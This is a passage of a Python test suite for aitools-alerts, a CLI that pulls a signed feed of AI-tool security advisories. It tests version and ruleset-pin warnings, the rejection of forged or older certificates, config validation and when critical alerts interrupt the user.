    m.post(m.bot_sec, "posted eleven minutes from now", created_at=T0 + 1000 + pull.MAX_AHEAD_S + 1)
    assert cli.main(["pull"]) == 0  # the signer's checkpoint does not list it yet
    assert cli.AHEAD_LINE.format(n=1) in capsys.readouterr().err
    reader_clock.at = T0 + 1000 + pull.MAX_AHEAD_S + 1
    assert cli.main(["pull"]) == 0
    assert "dated ahead" not in capsys.readouterr().err


def test_second_origin_setting(monkeypatch):
    """Default: the project's repository, for the pinned root only. "" turns it off."""
    assert config.load().second_origin is None
    pinned = type("A", (), {"root": cli.TRUST_ROOT_PUBKEY})()
    test_root = type("A", (), {"root": FIXTURE_ROOT})()
    assert cli._second_origin(pinned, config.load()) == config.DEFAULT_SECOND_ORIGIN
    assert config.DEFAULT_SECOND_ORIGIN.startswith("https://") and config.DEFAULT_SECOND_ORIGIN.endswith("/trust/")
    assert cli._second_origin(test_root, config.load()) is None  # the repository serves no test root
    write_config('second_origin = ""\n')
    assert cli._second_origin(pinned, config.load()) is None
    write_config('second_origin = "https://example.invalid/trust/"\n')
    assert cli._second_origin(test_root, config.load()) == "https://example.invalid/trust/"
    for bad in ('"http://example.invalid/trust/"', '"https://example.invalid/trust"', '"file:///tmp/x/"', "5",
                '"https://example.invalid/a b/"'):
        write_config(f"second_origin = {bad}\n")
        with pytest.raises(config.ConfigError, match="second_origin"):
            config.load()
    assert "second_origin" in config.TEMPLATE


def test_pull_prints_the_checkpoint_and_check_stays_quiet_when_verified(capsys):
    assert cli.main(["pull", "--mirror-url", MIRROR]) == 0
    assert "checkpoint 1 lists 2 events" in capsys.readouterr().out
    assert cli.main(["check"]) == 0
    out = capsys.readouterr().out
    assert "unverified" not in out and "stale" not in out


# ---------------------------------------------------------------- min_cli (ai-tools-alerts#t8jr)

def _mirror_with_min_cli(tmp_path, monkeypatch, min_cli):
    """A mirror on disk whose certificate names ``min_cli``, and the config and root for it."""
    from mirror_helpers import Mirror
    m = Mirror()  # dated at the tests' reader clock (conftest.reader_clock)
    m.publish_cert(min_cli=min_cli)
    m.root_post(m.bot_sec, advisory(posted_by="relay-bot"))
    (tmp_path / "mirror").mkdir()
    write_config(f'mirror_url = "{m.write(tmp_path / "mirror")}"\n')
    monkeypatch.setenv(cli.TRUST_ROOT_ENV, m.root)
    return m


def _upgrade_lines(capsys) -> list:
    return [x for x in capsys.readouterr().err.split("\n") if x.startswith("aitools-alerts: upgrade:")]


def test_an_older_cli_says_upgrade_once_on_every_command_and_changes_nothing_else(tmp_path, monkeypatch, sent, capsys):
    _mirror_with_min_cli(tmp_path, monkeypatch, "99.0.0")
    want = [f"aitools-alerts: upgrade: this aitools-alerts is {cli.__version__}; the feed needs 99.0.0 or later. "
            "Newer alerts may be missing or shown at an older level here. See the README to upgrade."]
    assert cli.main(["check"]) == 0 and _upgrade_lines(capsys) == []  # no pull yet: no certificate, no line
    for argv, status in ((["pull"], 0), (["check"], 0), (["check", "--json"], 0), (["plan", "AITA-TEST-0001"], 0),
                         (["run"], 2), (["notify"], 0), (["run", "--quiet"], 0), (["plan", "no-such-id"], 1)):
        assert cli.main(argv) == status, argv  # the status is the command's own
        assert _upgrade_lines(capsys) == want, argv
    assert cli.main(["run", "--json"]) == 0
    io = capsys.readouterr()
    assert json.loads(io.out)["min_cli"] == "99.0.0" and io.err.count("upgrade:") == 1
    assert len(json.loads(io.out)["matches"]) == 1  # the alert is still shown: nothing is hidden


@pytest.mark.parametrize("min_cli", [None, "0.0.1", cli.__version__])
def test_a_current_cli_says_nothing(tmp_path, monkeypatch, sent, capsys, min_cli):
    _mirror_with_min_cli(tmp_path, monkeypatch, min_cli)
    assert cli.main(["run", "--json"]) == 2
    io = capsys.readouterr()
    assert json.loads(io.out)["min_cli"] is None and "upgrade:" not in io.err


def test_min_cli_is_read_under_the_current_root_only(tmp_path, monkeypatch, sent, capsys):
    """A certificate stored under a test root says nothing once the root is the pinned one."""
    _mirror_with_min_cli(tmp_path, monkeypatch, "99.0.0")
    assert cli.main(["pull"]) == 0 and len(_upgrade_lines(capsys)) == 1
    monkeypatch.delenv(cli.TRUST_ROOT_ENV)
    assert cli.main(["check"]) == 0 and _upgrade_lines(capsys) == []


def test_min_cli_comes_only_from_a_certificate_the_root_signed_and_never_from_an_older_one(tmp_path, monkeypatch, capsys):
    """The certificate is the root's word: one signed by another key, or one issued
    before the certificate already held, cannot set or raise the floor."""
    from aitools_alerts import nostr
    m = _mirror_with_min_cli(tmp_path, monkeypatch, None)
    genuine = m.cert
    assert cli.main(["pull"]) == 0 and _upgrade_lines(capsys) == []
    forged = m.publish_cert(min_cli="99.0.0", signer=nostr.keygen()[0], issued=genuine["created_at"] + 10)
    older = m.publish_cert(min_cli="99.0.0", issued=genuine["created_at"] - 10)
    for cert in (forged, older):
        (tmp_path / "mirror" / "checkpoint-key.json").write_text(json.dumps(cert))
        cli.main(["pull"])
        assert _upgrade_lines(capsys) == [], cert["created_at"]
        assert State.load().cert_for(m.root).event["id"] == genuine["id"]
    newer = m.publish_cert(min_cli="99.0.0", issued=genuine["created_at"] + 10)  # the root raises the floor
    (tmp_path / "mirror" / "checkpoint-key.json").write_text(json.dumps(newer))
    assert cli.main(["pull"]) == 0 and len(_upgrade_lines(capsys)) == 1
    assert State.load().cert_for(m.root).min_cli == "99.0.0"  # it is in the state file: the next command says it too


def test_the_upgrade_line_survives_a_failed_pull(tmp_path, monkeypatch, sent, capsys):
    """A mirror that stops answering does not quiet the line: it comes from stored state."""
    _mirror_with_min_cli(tmp_path, monkeypatch, "99.0.0")
    assert cli.main(["pull"]) == 0 and len(_upgrade_lines(capsys)) == 1
    (tmp_path / "mirror" / "feed.json").write_text("{")
    assert cli.main(["pull"]) == 1 and len(_upgrade_lines(capsys)) == 1
    (tmp_path / "mirror" / "manifest.json").unlink()
    assert cli.main(["run"]) in (0, 2) and len(_upgrade_lines(capsys)) == 1


@pytest.mark.parametrize("have, need, older", [("0.9.0", "0.10.0", True), ("0.10.0", "0.9.0", False),
                                               ("1.0.0", "0.99.99", False), ("0.1.7", "0.1.8", True),
                                               ("0.1.7", "0.1.7", False), ("0.2.0rc1", "0.2.0", True),
                                               ("not a version", "9.9.9", False)])
def test_versions_are_compared_as_numbers(tmp_path, monkeypatch, capsys, have, need, older):
    _mirror_with_min_cli(tmp_path, monkeypatch, need)
    monkeypatch.setattr(cli, "__version__", have)
    assert cli.main(["pull"]) == 0
    assert len(_upgrade_lines(capsys)) == (1 if older else 0)


# ---------------------------------------------------------------- the ruleset pin (ai-tools-alerts#ed7n)

def _pin(**over):
    """A pin of this reader's own ruleset, changed by ``over``."""
    from aitools_alerts import ruleset
    rs = ruleset.load()
    return ruleset.Pin(**{"version": rs.version, "sha256": rs.digest, "min_version": 1, **over})


def _mirror_with_pin(tmp_path, monkeypatch, pin, min_cli=None):
    """A mirror on disk whose certificate carries ``pin``, and the config and root for it."""
    from mirror_helpers import Mirror
    m = Mirror()
    m.publish_cert(min_cli=min_cli, ruleset_pin=pin)
    m.root_post(m.bot_sec, advisory(posted_by="relay-bot"))
    (tmp_path / "mirror").mkdir()
    write_config(f'mirror_url = "{m.write(tmp_path / "mirror")}"\n')
    monkeypatch.setenv(cli.TRUST_ROOT_ENV, m.root)
    return m


def _outdated_lines(capsys) -> list:
    return [x for x in capsys.readouterr().err.split("\n") if x.startswith("aitools-alerts: out of date:")]


def test_a_cli_below_the_pins_min_version_says_out_of_date_on_every_command_and_hides_nothing(tmp_path, monkeypatch, sent, capsys):
    have = _pin().version
    _mirror_with_pin(tmp_path, monkeypatch, _pin(version=99, min_version=99, sha256="0" * 64))
    want = [f"aitools-alerts: out of date: this aitools-alerts has ruleset {have}; the trust root pins ruleset 99 "
            "and accepts none below 99. It judges no level until it is upgraded: no source check, no computed expiry; "
            "alerts are shown as posted. See the README to upgrade."]
    assert cli.main(["check"]) == 0 and _outdated_lines(capsys) == []  # no pull yet: no certificate, no line
    for argv, status in ((["pull"], 0), (["check"], 0), (["check", "--json"], 0), (["plan", "AITA-TEST-0001"], 0),
                         (["run"], 2), (["notify"], 0), (["run", "--quiet"], 0), (["verify"], 0),
                         (["plan", "no-such-id"], 1)):
        assert cli.main(argv) == status, argv  # the status is the command's own
        assert _outdated_lines(capsys) == want, argv
    assert len(sent["calls"]) == 1  # the critical was notified, once
    assert cli.main(["run", "--json"]) == 0
    io = capsys.readouterr()
    out = json.loads(io.out)
    assert out["ruleset_outdated"] == {"have": have, "pinned": 99, "min_version": 99}
    assert io.err.count("out of date:") == 1 and "upgrade:" not in io.err and out["min_cli"] is None
    assert [m["level"] for m in out["matches"]] == ["critical"]  # the alert is still shown, at its level


def test_a_cli_at_the_pinned_version_with_another_digest_says_out_of_date(tmp_path, monkeypatch, sent, capsys):
    have = _pin().version
    _mirror_with_pin(tmp_path, monkeypatch, _pin(sha256="0" * 64))
    assert cli.main(["run", "--json"]) == 2
    io = capsys.readouterr()
    assert json.loads(io.out)["ruleset_outdated"] == {"have": have, "pinned": have, "min_version": 1}
    assert [x for x in io.err.split("\n") if "out of date:" in x] == [
        f"aitools-alerts: out of date: this aitools-alerts has a ruleset {have} that differs from the "
        f"ruleset {have} the trust root pins. It judges no level until it is upgraded: no source check, "
        "no computed expiry; alerts are shown as posted. See the README to upgrade."]


@pytest.mark.parametrize("over", [None, {}, {"min_version": "own"}, {"version": 99, "sha256": "0" * 64},
                                  {"version": 99, "min_version": "own", "sha256": "0" * 64},
                                  {"version": 1, "min_version": 1, "sha256": "0" * 64}])
def test_a_cli_the_pin_allows_says_nothing(tmp_path, monkeypatch, sent, capsys, over):
    """No pin; the reader's own ruleset; a later pin whose min_version the reader meets; a pin the reader is ahead of."""
    if over is not None and over.get("min_version") == "own":
        over = {**over, "min_version": _pin().version}
    if over is not None and over.get("version") == 1 and _pin().version == 1:
        pytest.skip("this reader is on ruleset 1: no pin is behind it")
    _mirror_with_pin(tmp_path, monkeypatch, None if over is None else _pin(**over))
    assert cli.main(["run", "--json"]) == 2
    io = capsys.readouterr()
    assert json.loads(io.out)["ruleset_outdated"] is None and "out of date" not in io.err
    for argv in (["check"], ["pull"], ["plan", "AITA-TEST-0001"]):
        assert cli.main(argv) == 0 and _outdated_lines(capsys) == [], argv


def test_the_pin_is_read_under_the_current_root_only(tmp_path, monkeypatch, sent, capsys):
    _mirror_with_pin(tmp_path, monkeypatch, _pin(version=99, min_version=99, sha256="0" * 64))
    assert cli.main(["pull"]) == 0 and len(_outdated_lines(capsys)) == 1
    monkeypatch.delenv(cli.TRUST_ROOT_ENV)
    assert cli.main(["check"]) == 0 and _outdated_lines(capsys) == []


def test_an_old_release_with_an_old_ruleset_prints_both_lines_once_each(tmp_path, monkeypatch, sent, capsys):
    _mirror_with_pin(tmp_path, monkeypatch, _pin(version=99, min_version=99, sha256="0" * 64), min_cli="99.0.0")
    assert cli.main(["pull"]) == 0
    err = capsys.readouterr().err
    assert err.count("aitools-alerts: upgrade:") == 1 and err.count("aitools-alerts: out of date:") == 1


@pytest.mark.parametrize("first", [None, "own"])
def test_a_later_certificate_with_a_pin_this_cli_cannot_read_makes_it_out_of_date(tmp_path, monkeypatch, sent, capsys, first):
    """The reader holds a good certificate (no pin, or a pin it meets). The root then
    signs a later one whose pin is in a form this release does not know. The pull must
    not go on with the older certificate as if nothing were pinned."""
    m = _mirror_with_pin(tmp_path, monkeypatch, None if first is None else _pin())
    assert cli.main(["pull"]) == 0 and _outdated_lines(capsys) == []
    m.publish_unreadable_pin(later=500)
    m.write(tmp_path / "mirror")
    assert cli.main(["pull"]) == 0
    assert _outdated_lines(capsys) == [
        f"aitools-alerts: out of date: the trust root pins a ruleset in a form this aitools-alerts (ruleset {_pin().version}) "
        "cannot read. It judges no level until it is upgraded: no source check, no computed expiry; "
        "alerts are shown as posted. See the README to upgrade."]
    st = State.load()
    cert = st.cert_for(m.root)
    assert cert.ruleset is None and cert.ruleset_unreadable and cert.event["id"] == m.cert["id"]
    assert pull.unverified(st) is None  # the feed is still verified: only judging stops
    assert cli.main(["run", "--json"]) == 2
    out = json.loads(capsys.readouterr().out)
    assert out["ruleset_outdated"] == {"have": _pin().version, "pinned": None, "min_version": None}
    assert out["unverified"] is None and [x["level"] for x in out["matches"]] == ["critical"]
    assert out["matches"][0]["source_check"] is None


def test_a_ruleset_that_cannot_be_loaded_does_not_break_the_line(tmp_path, monkeypatch, sent, capsys):
    """The pin is there and the reader's own ruleset is damaged: the command's result stands."""
    from aitools_alerts import ruleset
    _mirror_with_pin(tmp_path, monkeypatch, _pin(version=99, min_version=99, sha256="0" * 64))
    assert cli.main(["pull"]) == 0 and len(_outdated_lines(capsys)) == 1

    def boom():
        raise ruleset.RulesetError("damaged")
    monkeypatch.setattr(ruleset, "load", boom)
    assert cli.main(["notify"]) == 0 and _outdated_lines(capsys) == []
    assert cli._outdated_line({"have": None, "pinned": None, "min_version": None}).startswith(
        "out of date: the trust root pins a ruleset in a form this aitools-alerts (ruleset unknown) cannot read.")


# ------------------------------------------------ may apply never interrupts (0xq6)

def _one_thread_mirror(monkeypatch, adv, patch=None):
    from mirror_helpers import Mirror
    m = Mirror()
    root = m.root_post(m.bot_sec, adv)
    if patch is not None:
        m.reply(m.bot_sec, root, m.patch_text(**patch))
    monkeypatch.setenv(cli.TRUST_ROOT_ENV, m.root)
    monkeypatch.setattr(pull, "default_fetch", m.fetch)
    write_config('mirror_url = "https://mirror.invalid/"\n')
    return root["id"]


def test_a_critical_that_only_may_apply_does_not_interrupt(monkeypatch, capsys, sent):
    from aitools_alerts.schema import Product
    adv = advisory(posted_by="relay-bot", products=[Product("Claude Code", "claude-code", None, None)])
    root = _one_thread_mirror(monkeypatch, adv)
    assert cli.main(["run", "--json"]) == 0
    out = json.loads(capsys.readouterr().out)
    assert [m["reason"] for m in out["matches"]] == ["may apply"] and out["matches"][0]["thread"] == root
    assert out["unseen_critical"] == [] and sent["calls"] == [] and State.load().seen == set()
    assert cli.main(["check"]) == 0
    text = capsys.readouterr().out
    assert "[Claude Code 2.0.0: may apply]" in text and "not installed here" not in text
    assert cli.main(["notify"]) == 0 and sent["calls"] == []


def test_a_reply_that_drops_the_range_still_exits_2(monkeypatch, capsys, sent):
    cc = {"name": "Claude Code", "ecosystem": "claude-code", "affected": None, "fixed": None}
    root = _one_thread_mirror(monkeypatch, advisory(posted_by="relay-bot"), patch={"products": [cc]})
    assert cli.main(["run", "--json"]) == 2
    out = json.loads(capsys.readouterr().out)
    assert sorted(m["reason"] for m in out["matches"]) == ["affected", "may apply"]
    assert out["unseen_critical"] == [root] and len(sent["calls"]) == 1
